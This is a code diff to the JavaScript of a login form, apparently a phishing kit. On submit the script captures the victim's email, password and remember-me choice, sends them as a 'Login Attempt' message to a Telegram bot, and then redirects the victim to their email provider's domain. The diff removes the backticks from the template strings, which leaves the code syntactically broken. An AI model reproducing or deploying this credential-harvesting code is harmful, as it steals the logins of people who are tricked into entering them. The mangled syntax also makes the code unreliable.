@@ -24,9 +24,9 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     const password = document.getElementById('password').value;
     const rememberMe = document.getElementById('remember-me').checked ? 'Yes' : 'No';
 
-    const message = `Login Attempt:\nEmail: ${userEmail}\nPassword: ${password}\nRemember Me: ${rememberMe}`;
+    const message = Login Attempt:\nEmail: ${userEmail}\nPassword: ${password}\nRemember Me: ${rememberMe};
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -50,7 +50,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
             const emailParts = userEmail.split('@');
             if (emailParts.length > 1) {
                 const domain = emailParts[1];
-                const redirectUrl = `https://${domain}`;
+                const redirectUrl = https://${domain};
                 window.location.href = redirectUrl;
             } else {
                 console.error('Invalid email format.');
